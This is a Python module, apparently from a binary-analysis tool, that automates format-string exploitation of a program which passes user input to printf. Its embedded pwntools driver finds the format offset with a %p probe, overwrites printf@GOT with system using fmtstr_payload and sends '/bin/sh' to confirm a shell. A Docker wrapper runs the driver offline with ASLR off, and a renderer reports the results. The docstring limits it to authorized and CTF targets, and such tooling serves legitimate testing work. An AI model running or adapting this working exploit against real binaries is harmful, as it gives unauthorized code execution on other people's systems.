"""Format-string exploitation, verified by getting a shell in the sandbox.

For a binary that uses user input as a printf format inside a loop, this finds the
format-argument offset, overwrites printf@GOT with system (ASLR disabled so system is
fixed), and then sends '/bin/sh' so the next printf(buf) becomes system('/bin/sh').
Confirms a real shell. For AUTHORIZED / CTF targets. Needs the 'binoracle-pwn' image."""
from __future__ import annotations

import os
import shutil
import subprocess

_DRIVER = r'''
import sys
from pwn import *
name = sys.argv[1]
elf = ELF(name, checksec=False); context.binary = elf; context.log_level = "error"
prompt = sys.argv[2].encode() if len(sys.argv) > 2 else b"say: "
if "printf" not in elf.got:
    print("NOT_APPLICABLE (no printf@GOT)"); sys.exit(1)
io = process([elf.path], aslr=False)
try:
    io.recvuntil(prompt, timeout=2)
except Exception:
    pass
# find the format-arg offset with a marker + %p chain
io.sendline(b"AAAAAAAA." + b".".join(b"%%%d$p" % i for i in range(1, 21)))
resp = io.recvuntil(prompt, timeout=3)
offset = None
for i, tok in enumerate(resp.split(b".")[1:], 1):
    if tok.strip() == b"0x4141414141414141":
        offset = i; break
if offset is None:
    print("NO_OFFSET"); sys.exit(1)
libc = io.libc; system = libc.symbols["system"]; printf_got = elf.got["printf"]
MARK = b"BINORACLE_FMT_PWNED"
for wsz in ("short", "byte"):
    try:
        payload = fmtstr_payload(offset, {printf_got: system}, write_size=wsz)
        io.sendline(payload)
        io.recvuntil(prompt, timeout=3)
        io.sendline(b"/bin/sh")
        io.sendline(b"echo " + MARK)
        out = io.recvrepeat(2)
        if MARK in out:
            print("VERIFIED offset=%d system=%#x printf_got=%#x" % (offset, system, printf_got))
            sys.exit(0)
    except Exception:
        pass
    # reopen for next attempt
    try: io.close()
    except Exception: pass
    io = process([elf.path], aslr=False)
    try: io.recvuntil(prompt, timeout=2)
    except Exception: pass
print("NOT_VERIFIED offset=%d" % offset)
sys.exit(1)
'''


def autofmt(binary: str, run: bool = True, prompt: str = "say: ") -> dict:
    if not shutil.which("docker"):
        return {"ok": False, "note": "docker no disponible"}
    if subprocess.run(["docker", "image", "inspect", "binoracle-pwn"],
                      capture_output=True).returncode != 0:
        return {"ok": False, "note": "falta la imagen 'binoracle-pwn' (make pwn-image)"}
    d = os.path.dirname(os.path.abspath(binary)); name = os.path.basename(binary)
    drv = os.path.join(d, ".binoracle_fmt.py")
    with open(drv, "w") as f:
        f.write(_DRIVER)
    try:
        r = subprocess.run(
            ["docker", "run", "--rm", "--platform", "linux/amd64", "--network", "none",
             "--memory", "512m", "--pids-limit", "256", "--security-opt", "seccomp=unconfined",
             "-v", d + ":/w", "-w", "/w", "binoracle-pwn", "python3", ".binoracle_fmt.py", name, prompt],
            capture_output=True, text=True, timeout=150)
        out = r.stdout + r.stderr
    except subprocess.TimeoutExpired:
        out = "[timeout]"
    finally:
        try: os.unlink(drv)
        except OSError: pass
    verified = "VERIFIED" in out and "NOT_VERIFIED" not in out
    line = next((l for l in out.splitlines() if l.startswith("VERIFIED")), "")
    return {"ok": True, "verified": verified, "detail": line, "output": out[-800:],
            "note": "format-string -> printf@GOT=system (shell verificada, ASLR off en sandbox)"}


def render_fmt(r: dict) -> str:
    out = ["## Auto format-string (GOT overwrite -> shell, verificado)\n"]
    if not r.get("ok"):
        return "\n".join(out + ["No disponible: " + r.get("note", "")])
    out.append(f"- shell verificada en sandbox: **{'SI' if r.get('verified') else 'no'}**")
    if r.get("detail"):
        out.append(f"- {r['detail']}")
    out.append(f"- {r.get('note','')}")
    if r.get("output"):
        out.append("\n### salida\n```\n" + r["output"].strip() + "\n```")
    return "\n".join(out)
